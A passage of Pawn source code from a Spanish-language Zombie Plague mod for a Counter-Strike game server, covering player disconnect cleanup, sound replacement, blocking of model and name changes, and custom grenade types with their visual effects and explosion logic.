		set_task(random_float(300.0, 350.0), "TASK_Vinc", id, _, _, "b")
		
		// Lighting task
		set_task(5.0, "lighting_effects")
		
		// Set the custom HUD display task
		set_task(0.1, "ShowHUD", id+TASK_SHOWHUD, _, _, "b")
		
		// Record time
		//set_task(1.0, "TASK_RecordTime", id, _, _, "b")
	}
}

// ChangeLevel
/*public server_changelevel()
{
	for( new i = 1; i <= g_maxplayers; i++ )
	{
		remove_task( i + TASK_INFOCOMBO )
		set_task( 0.1, "InformacionCombo", i + TASK_INFOCOMBO )

		remove_task( i + TASK_FINISHCOMBO )
		set_task( 0.1, "FinishCombo", i + TASK_FINISHCOMBO )
		
		SaveDates(i, 1, 1, 0)
	}
}*/

/*GetMinTimePlayed()
{
	static iPlayers[32], iNum ; get_players(iPlayers, iNum)
	static i, id, iMaxNumUser
	
	for ( i = 0; i < iNum; i++ )
	{
		id = iPlayers[i]
		
		if( get_user_flags( id ) & ADMIN_RESERVATION )
			continue;
		
		if ( !iMaxNumUser )
			iMaxNumUser = iPlayers[0]
		
		if ( get_user_time(id, 0) < get_user_time(iMaxNumUser, 0) )
			iMaxNumUser = id
	}
	
	return iMaxNumUser;
}*/

// Client leaving primary
public client_disconnect(id)
{
	SaveDates(id, 1, 1, 1)
	
	// Check that we still have both humans and zombies to keep the round going
	if (g_isalive[id]) check_round(id)
	
	// Remove previous tasks
	remove_task(id+TASK_TEAM)
	remove_task(id+TASK_MODEL)
	/*remove_task(id+TASK_FLASH)
	remove_task(id+TASK_CHARGE)*/
	remove_task(id+TASK_SPAWN)
	remove_task(id+TASK_BLOOD)
	remove_task(id+TASK_AURA)
	remove_task(id+TASK_BURN)
	remove_task(id+TASK_NVISION)
	remove_task(id+TASK_SHOWHUD)
	remove_task(id+TASK_INFOCOMBO)
	remove_task(id+TASK_FINISHCOMBO)
	
	// Player left, clear cached flags
	g_isconnected[id] = false
	g_isalive[id] = false
	gLogeado[id] = 0
	gRegistrado[id] = 0
}

// Client left
public fw_ClientDisconnect_Post()
{
	// Last Zombie Check
	fnCheckLastZombie()
}

// Client Kill Forward
public fw_ClientKill()
{
	// Prevent players from killing themselves?
	return FMRES_SUPERCEDE;
}

// Emit Sound Forward
public fw_EmitSound(id, channel, const sample[128], Float:volume, Float:attn, flags, pitch)
{
	// Block all those unneeeded hostage sounds
	if (equal(sample[0], "hostage", 7))
		return FMRES_SUPERCEDE;
	
	// Replace these next sounds for zombies only
	if (!is_user_valid_connected(id))
		return FMRES_IGNORED;
	
	if( g_isalive[id] && gJason[id] )
	{
		for(new i = 0; i < sizeof( gCHAINSAW_SOUNDS ); i++)
		{
			if(equal(sample, gOLDKNIFE_SOUNDS[i]))
			{
				// Emit New sound and Stop old Sound
				emit_sound(id, channel, gCHAINSAW_SOUNDS[i], 1.0, ATTN_NORM, 0, PITCH_NORM)
				return FMRES_SUPERCEDE;
			}
		}
	}
	
	if(equal(sample[10], "fall", 4))
		return FMRES_SUPERCEDE;
	
	if (!g_zombie[id])
		return FMRES_IGNORED;
	
	//static sound[128]
	
	// Zombie being hit
	if (equal(sample[7], "bhit", 4))
	{
		if (g_nemesis[id])
		{
			//ArrayGetString(nemesis_pain, random_num(0, ArraySize(nemesis_pain) - 1), sound, charsmax(sound))
			emit_sound(id, channel, gSOUND_NEMESIS_PAIN[random_num(0, sizeof gSOUND_NEMESIS_PAIN -1)], volume, attn, flags, pitch)
		}
		else
		{
			//ArrayGetString(zombie_pain, random_num(0, ArraySize(zombie_pain) - 1), sound, charsmax(sound))
			emit_sound(id, channel, gSOUND_ZOMBIE_PAIN[random_num(0, sizeof gSOUND_ZOMBIE_PAIN -1)], volume, attn, flags, pitch)
		}
		return FMRES_SUPERCEDE;
	}
	
	// Zombie attacks with knife
	if (equal(sample[8], "kni", 3))
	{
		if (equal(sample[14], "sla", 3)) // slash
		{
			//ArrayGetString(zombie_miss_slash, random_num(0, ArraySize(zombie_miss_slash) - 1), sound, charsmax(sound))
			emit_sound(id, channel, gSOUND_ZOMBIE_MISS_SLASH[random_num(0, sizeof gSOUND_ZOMBIE_MISS_SLASH -1)], volume, attn, flags, pitch)
			return FMRES_SUPERCEDE;
		}
		if (equal(sample[14], "hit", 3)) // hit
		{
			if (equal(sample[17], "w", 1)) // wall
			{
				//ArrayGetString(zombie_miss_wall, random_num(0, ArraySize(zombie_miss_wall) - 1), sound, charsmax(sound))
				emit_sound(id, channel, gSOUND_ZOMBIE_MISS_WALL, volume, attn, flags, pitch)
				return FMRES_SUPERCEDE;
			}
			else
			{
				//ArrayGetString(zombie_hit_normal, random_num(0, ArraySize(zombie_hit_normal) - 1), sound, charsmax(sound))
				emit_sound(id, channel, gSOUND_ZOMBIE_HIT_NORMAL[random_num(0, sizeof gSOUND_ZOMBIE_HIT_NORMAL -1)], volume, attn, flags, pitch)
				return FMRES_SUPERCEDE;
			}
		}
		if (equal(sample[14], "sta", 3)) // stab
		{
			//ArrayGetString(zombie_hit_stab, random_num(0, ArraySize(zombie_hit_stab) - 1), sound, charsmax(sound))
			emit_sound(id, channel, gSOUND_ZOMBIE_HIT_STAB, volume, attn, flags, pitch)
			return FMRES_SUPERCEDE;
		}
	}
	
	// Zombie dies
	if (equal(sample[7], "die", 3) || equal(sample[7], "dea", 3))
	{
		//ArrayGetString(zombie_die, random_num(0, ArraySize(zombie_die) - 1), sound, charsmax(sound))
		emit_sound(id, channel, gSOUND_ZOMBIE_DIE[random_num(0, sizeof gSOUND_ZOMBIE_DIE -1)], volume, attn, flags, pitch)
		return FMRES_SUPERCEDE;
	}
	
	return FMRES_IGNORED;
}

// Forward Set ClientKey Value -prevent CS from changing player models-
public fw_SetClientKeyValue(id, const infobuffer[], const key[])
{
	// Block CS model changes
	if (key[0] == 'm' && key[1] == 'o' && key[2] == 'd' && key[3] == 'e' && key[4] == 'l')
		return FMRES_SUPERCEDE;
	
	return FMRES_IGNORED;
}

// Forward Client User Info Changed -prevent players from changing models-
public fw_ClientUserInfoChanged(id, buffer)
{
	// Get current model
	static currentmodel[32]
	fm_cs_get_user_model(id, currentmodel, charsmax(currentmodel))
	
	// If they're different, set model again
	if (!equal(currentmodel, g_playermodel[id]) && !task_exists(id+TASK_MODEL))
		fm_cs_set_user_model(id+TASK_MODEL)
	
	if( !g_isconnected[id] ) 
		return FMRES_IGNORED;
		
	new szNick[32];
	engfunc(EngFunc_InfoKeyValue, buffer, "name", szNick, charsmax(szNick))
	
	if( equal( szNick, g_playername[id] ) )
		return FMRES_IGNORED;
		
	// No change nick
	if( !gChangeNick[id] )
	{
		engfunc(EngFunc_SetClientKeyValue, id, buffer, "name", g_playername[id])
		client_cmd(id, "name ^"%s^"; setinfo name ^"%s^"", g_playername[id], g_playername[id])
		
		console_print(id, "No podes cambiarte el nombre una vez identificado en el juego")
	}
	
	/*static team
	team = fm_cs_get_user_team(id)
	
	if (team == FM_CS_TEAM_SPECTATOR || team == FM_CS_TEAM_UNASSIGNED)
	{
		// Cache player's name
		get_user_name(id, g_playername[id], charsmax(g_playername[]))
		
		// Replace invalid characters
		replace_all( g_playername[id], charsmax(g_playername[]), "\", "" )
		replace_all( g_playername[id], charsmax(g_playername[]), "/", "" )
		
		engfunc(EngFunc_SetClientKeyValue, id, buffer, "name", g_playername[id])
		client_cmd(id, "name ^"%s^"; setinfo name ^"%s^"", g_playername[id], g_playername[id])
	}
	else
	{
	
	return FMRES_IGNORED;
	}*/
	
	return FMRES_SUPERCEDE;
}

// Forward Get Game Description
/*public fw_GetGameDescription()
{
	// Return the mod name so it can be easily identified
	forward_return(FMV_STRING, g_modname)
	
	return FMRES_SUPERCEDE;
}*/

// Forward Set Model
public fw_SetModel(entity, const model[])
{
	// We don't care
	if (strlen(model) < 8)
		return FMRES_IGNORED;
	
	// Get entity's classname
	static classname[32]
	entity_get_string(entity, EV_SZ_classname, classname, charsmax(classname))
	
	// Check if it's a weapon box
	if (equal(classname, "weaponbox"))
	{
		// They get automatically removed when thinking
		entity_set_float( entity, EV_FL_nextthink, get_gametime( ) + 0.01/*5.0*/ )
		
		/*#if defined WEAPONS_EDIT_FOR_DROP
		static Index; Index = entity_get_edict( entity, EV_ENT_owner )
		static WeaponIndex[sizeof WeaponEditNames]; 
		for( new i = 0; i < sizeof WeaponEditNames; i++ )
			WeaponIndex[i] = find_ent_by_owner( -1, WeaponEditNames[i], entity )
		
		if( ( gWeapon[Index][ARMA_PRIMARIA][M3] || gWeapon[Index][ARMA_PRIMARIA][M3_2] ) && is_valid_ent( WeaponIndex[0] ) ) // ARMAS PRIMARIAS
		{
			if( gWeapon[Index][ARMA_PRIMARIA][M3] ) 
			{
				entity_set_int( WeaponIndex[0], EV_INT_impulse, _M3 )
				gWeapon[Index][ARMA_PRIMARIA][M3] = 0
			}
			else if( gWeapon[Index][ARMA_PRIMARIA][M3_2] )
			{
				entity_set_int( WeaponIndex[0], EV_INT_impulse, _M3_2 )
				gWeapon[Index][ARMA_PRIMARIA][M3_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_PRIMARIA][MP5_NAVY] || gWeapon[Index][ARMA_PRIMARIA][MP5_NAVY_2] ) && is_valid_ent( WeaponIndex[1] ) )
		{
			if( gWeapon[Index][ARMA_PRIMARIA][MP5_NAVY] ) 
			{
				entity_set_int( WeaponIndex[1], EV_INT_impulse, _MP5_NAVY )
				gWeapon[Index][ARMA_PRIMARIA][MP5_NAVY] = 0
			}
			else if( gWeapon[Index][ARMA_PRIMARIA][MP5_NAVY_2] ) 
			{
				entity_set_int( WeaponIndex[1], EV_INT_impulse, _MP5_NAVY_2 )
				gWeapon[Index][ARMA_PRIMARIA][MP5_NAVY_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_PRIMARIA][COLT] || gWeapon[Index][ARMA_PRIMARIA][COLT_2] ) && is_valid_ent( WeaponIndex[2] ) )
		{
			if( gWeapon[Index][ARMA_PRIMARIA][COLT] ) 
			{
				entity_set_int( WeaponIndex[2], EV_INT_impulse, _COLT )
				gWeapon[Index][ARMA_PRIMARIA][COLT] = 0
			}
			else if( gWeapon[Index][ARMA_PRIMARIA][COLT_2] ) 
			{
				entity_set_int( WeaponIndex[2], EV_INT_impulse, _COLT_2 )
				gWeapon[Index][ARMA_PRIMARIA][COLT_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_PRIMARIA][AK47] || gWeapon[Index][ARMA_PRIMARIA][AK47_2] ) && is_valid_ent( WeaponIndex[3] ) )
		{
			if( gWeapon[Index][ARMA_PRIMARIA][AK47] ) 
			{
				entity_set_int( WeaponIndex[3], EV_INT_impulse, _AK47 )
				gWeapon[Index][ARMA_PRIMARIA][AK47] = 0
			}
			else if( gWeapon[Index][ARMA_PRIMARIA][AK47_2] ) 
			{
				entity_set_int( WeaponIndex[3], EV_INT_impulse, _AK47_2 )
				gWeapon[Index][ARMA_PRIMARIA][AK47_2] = 0
			}
		}
		else if( gWeapon[Index][ARMA_PRIMARIA][TMP] && is_valid_ent( WeaponIndex[4] ) )
		{
			entity_set_int( WeaponIndex[4], EV_INT_impulse, _TMP )
			gWeapon[Index][ARMA_PRIMARIA][TMP] = 0
		}
		else if( gWeapon[Index][ARMA_PRIMARIA][AUG] && is_valid_ent( WeaponIndex[5] ) )
		{
			entity_set_int( WeaponIndex[5], EV_INT_impulse, _AUG )
			gWeapon[Index][ARMA_PRIMARIA][AUG] = 0
		}
		else if( gWeapon[Index][ARMA_PRIMARIA][SG550] && is_valid_ent( WeaponIndex[6] ) )
		{
			entity_set_int( WeaponIndex[6], EV_INT_impulse, _SG550 )
			gWeapon[Index][ARMA_PRIMARIA][SG550] = 0
		}
		else if( gWeapon[Index][ARMA_PRIMARIA][XM1014] && is_valid_ent( WeaponIndex[7] ) )
		{
			entity_set_int( WeaponIndex[7], EV_INT_impulse, _XM1014 )
			gWeapon[Index][ARMA_PRIMARIA][XM1014] = 0
		}
		else if( gWeapon[Index][ARMA_PRIMARIA][M249] && is_valid_ent( WeaponIndex[8] ) )
		{
			entity_set_int( WeaponIndex[8], EV_INT_impulse, _M249 )
			gWeapon[Index][ARMA_PRIMARIA][M249] = 0
		}
		else if( ( gWeapon[Index][ARMA_SECUNDARIA][GLOCK] || gWeapon[Index][ARMA_SECUNDARIA][GLOCK_2] ) && is_valid_ent( WeaponIndex[9] ) ) // ARMAS SECUNDARIAS
		{
			if( gWeapon[Index][ARMA_SECUNDARIA][GLOCK] ) 
			{
				entity_set_int( WeaponIndex[9], EV_INT_impulse, _GLOCK )
				gWeapon[Index][ARMA_SECUNDARIA][GLOCK] = 0
			}
			else if( gWeapon[Index][ARMA_SECUNDARIA][GLOCK_2] ) 
			{
				entity_set_int( WeaponIndex[9], EV_INT_impulse, _GLOCK_2 )
				gWeapon[Index][ARMA_SECUNDARIA][GLOCK_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_SECUNDARIA][USP] || gWeapon[Index][ARMA_SECUNDARIA][USP_2] ) && is_valid_ent( WeaponIndex[10] ) )
		{
			if( gWeapon[Index][ARMA_SECUNDARIA][USP] ) 
			{
				entity_set_int( WeaponIndex[10], EV_INT_impulse, _USP )
				gWeapon[Index][ARMA_SECUNDARIA][USP] = 0
			}
			else if( gWeapon[Index][ARMA_SECUNDARIA][USP_2] ) 
			{
				entity_set_int( WeaponIndex[10], EV_INT_impulse, _USP_2 )
				gWeapon[Index][ARMA_SECUNDARIA][USP_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_SECUNDARIA][P228] || gWeapon[Index][ARMA_SECUNDARIA][P228_2] ) && is_valid_ent( WeaponIndex[11] ) )
		{
			if( gWeapon[Index][ARMA_SECUNDARIA][P228] ) 
			{
				entity_set_int( WeaponIndex[11], EV_INT_impulse, _P228 )
				gWeapon[Index][ARMA_SECUNDARIA][P228] = 0
			}
			else if( gWeapon[Index][ARMA_SECUNDARIA][P228_2] ) 
			{
				entity_set_int( WeaponIndex[11], EV_INT_impulse, _P228_2 )
				gWeapon[Index][ARMA_SECUNDARIA][P228_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_SECUNDARIA][FIVESEVEN] || gWeapon[Index][ARMA_SECUNDARIA][FIVESEVEN_2] ) && is_valid_ent( WeaponIndex[12] ) )
		{
			if( gWeapon[Index][ARMA_SECUNDARIA][FIVESEVEN] ) 
			{
				entity_set_int( WeaponIndex[12], EV_INT_impulse, _FIVESEVEN )
				gWeapon[Index][ARMA_SECUNDARIA][FIVESEVEN] = 0
			}
			else if( gWeapon[Index][ARMA_SECUNDARIA][FIVESEVEN_2] ) 
			{
				entity_set_int( WeaponIndex[12], EV_INT_impulse, _FIVESEVEN_2 )
				gWeapon[Index][ARMA_SECUNDARIA][FIVESEVEN_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_SECUNDARIA][ELITE] || gWeapon[Index][ARMA_SECUNDARIA][ELITE_2] ) && is_valid_ent( WeaponIndex[13] ) )
		{
			if( gWeapon[Index][ARMA_SECUNDARIA][ELITE] ) 
			{
				entity_set_int( WeaponIndex[13], EV_INT_impulse, _ELITE )
				gWeapon[Index][ARMA_SECUNDARIA][ELITE] = 0
			}
			else if( gWeapon[Index][ARMA_SECUNDARIA][ELITE_2] ) 
			{
				entity_set_int( WeaponIndex[13], EV_INT_impulse, _ELITE_2 )
				gWeapon[Index][ARMA_SECUNDARIA][ELITE_2] = 0
			}
		}
		else if( ( gWeapon[Index][ARMA_SECUNDARIA][DEAGLE] || gWeapon[Index][ARMA_SECUNDARIA][DEAGLE_2] ) && is_valid_ent( WeaponIndex[14] ) )
		{
			if( gWeapon[Index][ARMA_SECUNDARIA][DEAGLE] ) 
			{
				entity_set_int( WeaponIndex[14], EV_INT_impulse, _DEAGLE )
				gWeapon[Index][ARMA_SECUNDARIA][DEAGLE] = 0
			}
			else if( gWeapon[Index][ARMA_SECUNDARIA][DEAGLE_2] ) 
			{
				entity_set_int( WeaponIndex[14], EV_INT_impulse, _DEAGLE_2 )
				gWeapon[Index][ARMA_SECUNDARIA][DEAGLE_2] = 0
			}
		}
		#endif*/
		
		return FMRES_IGNORED;
	}
	
	// Narrow down our matches a bit
	if (model[7] != 'w' || model[8] != '_')
		return FMRES_IGNORED;
	
	// Get damage time of grenade
	static Float:dmgtime
	dmgtime = entity_get_float(entity, EV_FL_dmgtime)
	
	// Grenade not yet thrown
	if (dmgtime == 0.0)
		return FMRES_IGNORED;
	
	// Get whether grenade's owner is a zombie
	new id = entity_get_edict( entity, EV_ENT_owner )
	if (g_zombie[id] && !g_nemesis[id] && !gTroll[id])
	{
		if (model[9] == 'h' && model[10] == 'e') // Infection Bomb
		{
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 0, 200, 0, kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(9) // life
			write_byte(9) // width
			write_byte(0) // r
			write_byte(200) // g
			write_byte(0) // b
			write_byte(200) // brightness
			message_end()
			
			if( gImpact[id][GRENADE_INFECTION] )
			{
				// Set grenade type on the thrown grenade entity
				entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_INFECTION_IMPACT)
				entity_set_float( entity, EV_FL_dmgtime, get_gametime( ) + 9999.0 )
			}
			else entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_INFECTION)
		}
	}
	else if (model[9] == 'h' && model[10] == 'e') // Napalm Grenade
	{
		#if defined MOLOTOV_ON
		if( gMolotov[id][0] > 0 && last_Molotov_ent != entity ) // Molotov chica
		{
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 200, 0, 0, kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(9) // life
			write_byte(5) // width
			write_byte(200) // r
			write_byte(100) // g
			write_byte(0) // b
			write_byte(200) // brightness
			message_end()
			
			set_task( 0.01, "EffectMolotov", entity + TASK_MOLOTOV_EFFECT, _, _, "b" )
			
			last_Molotov_ent = entity
			
			// Set grenade type on the thrown grenade entity
			entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_MOLOTOV)
			
			entity_set_float( entity, EV_FL_dmgtime, get_gametime( ) + 9999.0 )
			gMolotov[id][0]--
			replace_weapon_models(id, CSW_HEGRENADE)
			engfunc(EngFunc_SetModel, entity, "models/molotov/w_molotov.mdl")
			
			return FMRES_SUPERCEDE;
		}
		else if( gMolotov[id][1] > 0 && last_Molotov_ent != entity ) // Molotov
		{
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 225, 0, 0, kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(9) // life
			write_byte(6) // width
			write_byte(225) // r
			write_byte(85) // g
			write_byte(0) // b
			write_byte(200) // brightness
			message_end()
			
			set_task( 0.01, "EffectMolotov", entity + TASK_MOLOTOV_EFFECT, _, _, "b" )
			
			last_Molotov_ent = entity
			
			// Set grenade type on the thrown grenade entity
			entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_MOLOTOV_1)
			
			entity_set_float( entity, EV_FL_dmgtime, get_gametime( ) + 9999.0 )
			gMolotov[id][1]--
			replace_weapon_models(id, CSW_HEGRENADE)
			engfunc(EngFunc_SetModel, entity, "models/molotov/w_molotov.mdl")
			
			return FMRES_SUPERCEDE;
		}
		else if( gMolotov[id][2] > 0 && last_Molotov_ent != entity ) // Molotov grande
		{
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(8) // life
			write_byte(7) // width
			write_byte(255) // r
			write_byte(55) // g
			write_byte(0) // b
			write_byte(200) // brightness
			message_end()
			
			set_task( 0.01, "EffectMolotov", entity + TASK_MOLOTOV_EFFECT, _, _, "b" )
			
			last_Molotov_ent = entity
			
			// Set grenade type on the thrown grenade entity
			entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_MOLOTOV_2)
			
			entity_set_float( entity, EV_FL_dmgtime, get_gametime( ) + 9999.0 )
			gMolotov[id][2]--
			replace_weapon_models(id, CSW_HEGRENADE)
			engfunc(EngFunc_SetModel, entity, "models/molotov/w_molotov.mdl")
			
			return FMRES_SUPERCEDE;
		}
		else
		#endif
		{
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 200, 0, 0, kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(8) // life
			write_byte(8) // width
			write_byte(200) // r
			write_byte(0) // g
			write_byte(0) // b
			write_byte(200) // brightness
			message_end()
			
			if( gImpact[id][GRENADE_NAPALM] ) 
			{
				// Set grenade type on the thrown grenade entity
				entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_NAPALM_IMPACT)
				entity_set_float( entity, EV_FL_dmgtime, get_gametime( ) + 9999.0 )
			}
			else entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_NAPALM)
		}
	}
	else if (model[9] == 'f' && model[10] == 'l') // Frost Grenade
	{
		if( gSuperNova[id] > 0 )
		{
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 0, 100, 200, kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(6) // life
			write_byte(6) // width
			write_byte(0) // r
			write_byte(100) // g
			write_byte(200) // b
			write_byte(200) // brightness
			message_end()
			
			if( gImpact[id][GRENADE_SUPERNOVA] ) 
			{
				// Set grenade type on the thrown grenade entity
				entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_SUPERNOVA_IMPACT)
				entity_set_float( entity, EV_FL_dmgtime, get_gametime( ) + 9999.0 )
			}
			else entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_SUPERNOVA)
			
			gSuperNova[id]--
			replace_weapon_models(id, CSW_FLASHBANG)
		}
		else
		{
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 0, 100, 200, kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(8) // life
			write_byte(8) // width
			write_byte(0) // r
			write_byte(100) // g
			write_byte(200) // b
			write_byte(200) // brightness
			message_end()
			
			if( gImpact[id][GRENADE_FROST] ) 
			{
				// Set grenade type on the thrown grenade entity
				entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_FROST_IMPACT)
				entity_set_float( entity, EV_FL_dmgtime, get_gametime( ) + 9999.0 )
			}
			else entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_FROST)
		}
	}
	else if (model[9] == 's' && model[10] == 'm') // Flare
	{
		if( g_survivor[id] && g_survround )
		{
			emit_sound(entity, CHAN_WEAPON, "zombie_plague/survivor2.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
			
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, 255, 255, 0, kRenderNormal, 16);
			
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(8) // life
			write_byte(5) // width
			write_byte(255) // r
			write_byte(255) // g
			write_byte(0) // b
			write_byte(255) // brightness
			message_end()
			
			// Set grenade type on the thrown grenade entity
			entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_ANIQUILATION)
		}
		else if( gBubble[id] > 0 )
		{
			new iRGB[3];
			if( g_survivor[id] && gArmageddonRound ) iRGB = { 0, 0, 255 }
			else iRGB = { 255, 255, 255 }
			
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, iRGB[0], iRGB[1], iRGB[2], kRenderNormal, 16);
			
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(8) // life
			write_byte(5) // width
			write_byte(iRGB[0]) // r
			write_byte(iRGB[1]) // g
			write_byte(iRGB[2]) // b
			write_byte(255) // brightness
			message_end()
			
			// Set grenade type on the thrown grenade entity
			entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_BUBBLE)
			
			gBubble[id]--
			replace_weapon_models(id, CSW_SMOKEGRENADE)
			engfunc(EngFunc_SetModel, entity, "models/zombie_plague/tcs_w_bubble.mdl")
			
			return FMRES_SUPERCEDE;
		}
		else
		{
			// Build flare's color
			static rgb[3]
			rgb[0] = 255 // r
			rgb[1] = 255 // g
			rgb[2] = 255 // b
			
			// Give it a glow
			fm_set_rendering(entity, kRenderFxGlowShell, rgb[0], rgb[1], rgb[2], kRenderNormal, 16);
			
			// And a colored trail
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(TE_BEAMFOLLOW) // TE id
			write_short(entity) // entity
			write_short(g_trailSpr) // sprite
			write_byte(8) // life
			write_byte(8) // width
			write_byte(rgb[0]) // r
			write_byte(rgb[1]) // g
			write_byte(rgb[2]) // b
			write_byte(200) // brightness
			message_end()
			
			// Set grenade type on the thrown grenade entity
			entity_set_int(entity, PEV_NADE_TYPE, NADE_TYPE_FLARE)
			
			// Set flare color on the thrown grenade entity
			set_pev(entity, PEV_FLARE_COLOR, rgb)
		}
	}
	
	return FMRES_IGNORED
}

// Ham Grenade Think Forward
public fw_ThinkGrenade(entity)
{
	// Invalid entity
	if (!is_valid_ent(entity)) return HAM_IGNORED;
	
	// Get damage time of grenade
	static Float:dmgtime, Float:current_time
	dmgtime = entity_get_float( entity, EV_FL_dmgtime )
	current_time = halflife_time()
	
	// Check if it's time to go off
	if (dmgtime > current_time)
		return HAM_IGNORED;
	
	// Check if it's one of our custom nades
	switch (entity_get_int(entity, PEV_NADE_TYPE))
	{
		case NADE_TYPE_INFECTION: // Infection Bomb
		{
			infection_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_INFECTION_IMPACT: // Infection Bomb Impact
		{
			infection_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_NAPALM: // Napalm Grenade
		{
			fire_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_NAPALM_IMPACT: // Napalm Grenade Impact
		{
			fire_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_FROST: // Frost Grenade
		{
			frost_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_FROST_IMPACT: // Frost Grenade Impact
		{
			frost_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_FLARE: // Flare
		{
			// Get its duration
			static duration
			duration = entity_get_int(entity, PEV_FLARE_DURATION)
			
			// Already went off, do lighting loop for the duration of PEV_FLARE_DURATION
			if (duration > 0)
			{
				// Check whether this is the last loop
				if (duration == 1)
				{
					// Get rid of the flare entity
					remove_entity(entity)
					return HAM_SUPERCEDE;
				}
				
				// Light it up!
				flare_lighting(entity, duration)
				
				// Set time for next loop
				entity_set_int(entity, PEV_FLARE_DURATION, --duration)
				entity_set_float(entity, EV_FL_dmgtime, current_time + 5.0)
			}
			// Light up when it's stopped on ground
			else if ((get_entity_flags(entity) & FL_ONGROUND) && fm_get_speed(entity) < 5)
			{
				// Flare sound
				//static sound[64]
				//ArrayGetString(grenade_flare, random_num(0, ArraySize(grenade_flare) - 1), sound, charsmax(sound))
				emit_sound(entity, CHAN_WEAPON, gSOUND_GRENADE_FLARE, 1.0, ATTN_NORM, 0, PITCH_NORM)
				
				// Set duration and start lightning loop on next think
				entity_set_int(entity, PEV_FLARE_DURATION, 1 + 16)
				entity_set_float(entity, EV_FL_dmgtime, current_time + 0.1)
			}
			else
			{
				// Delay explosion until we hit ground
				entity_set_float(entity, EV_FL_dmgtime, current_time + 0.5 )
				return HAM_IGNORED;
			}
		}
		#if defined MOLOTOV_ON
		case NADE_TYPE_MOLOTOV: // Molotov chica
		{
			molotov_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_MOLOTOV_1: // Molotov
		{
			molotov_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_MOLOTOV_2: // Molotov grande
		{
			molotov_explode(entity)
			return HAM_SUPERCEDE;
		}
		#endif
		case NADE_TYPE_SUPERNOVA: // SuperNova
		{
			supernova_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_SUPERNOVA_IMPACT: // SuperNova Impact
		{
			supernova_explode(entity)
			return HAM_SUPERCEDE;
		}
		case NADE_TYPE_BUBBLE: // Bubble
		{
			// Get its duration
			static duration
			duration = entity_get_int(entity, PEV_FLARE_DURATION)
			
			// Already went off, do lighting loop for the duration of PEV_FLARE_DURATION
			if (duration > 0)
			{
				// Check whether this is the last loop
				if (duration == 1)
				{
					static Victima, Float:Origin[3], players[33], i;
					entity_get_vector( entity, EV_VEC_origin, Origin )
					
					Victima = -1
					i = 0
					
